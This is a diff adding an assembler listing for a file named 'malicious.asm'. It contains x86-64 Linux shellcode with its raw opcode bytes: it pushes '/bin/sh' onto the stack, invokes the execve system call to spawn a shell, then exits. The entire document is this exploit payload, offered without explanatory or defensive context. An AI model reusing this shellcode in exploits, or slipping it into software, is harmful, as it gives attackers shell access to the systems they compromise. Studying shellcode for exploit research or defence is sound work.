@@ -1,0 +1,18 @@
+     1                                 %line 1+1 malicious.asm
+     2                                 [section .text]
+     3                                 [global _start]
+     4                                 _start:
+     5                                 
+     6 00000000 4D31FF                  xor r15, r15
+     7 00000003 49BF2F62696E2F7368-     mov r15, "/bin/sh"
+     8 00000003 00                 
+     9 0000000D 4157                    push r15
+    10 0000000F 4889E7                  mov rdi, rsp
+    11 00000012 48C7C03B000000          mov rax, 59
+    12 00000019 0F05                    syscall
+    13                                 
+    14                                 
+    15 0000001B 48C7C700000000          mov rdi, 0
+    16 00000022 48C7C03C000000          mov rax, 60
+    17 00000029 0F05                    syscall
+    18                                 
